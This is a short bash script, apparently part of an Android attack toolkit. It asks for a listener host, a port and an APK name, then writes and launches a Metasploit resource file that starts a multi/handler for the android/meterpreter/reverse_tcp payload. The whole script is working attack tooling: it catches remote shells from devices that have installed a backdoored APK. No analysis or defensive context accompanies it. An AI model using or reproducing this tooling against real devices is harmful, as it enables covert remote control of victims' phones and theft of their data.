#!/bin/bash
clear
echo  -e "\e[1;32m Join Msf  \e[0m"
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME             : " RC
	echo -e "\e[1;36;48mCREATING EXECUTABLE FILE FOR METASPLOIT\e[0m"
	echo `touch $RC.rc`
	echo "use exploit/multi/handler" >>  $RC.rc
	echo "set payload android/meterpreter/reverse_tcp" >>  $RC.rc
	echo "set LHOST $LHOST" >> $RC.rc
	echo "set LPORT $LPORT" >> $RC.rc
	echo "run" >> $RC.rc
	
	echo `xfce4-terminal --title="METASPLOIT" --color-bg="black" --execute sudo msfconsole -r $RC.rc &`

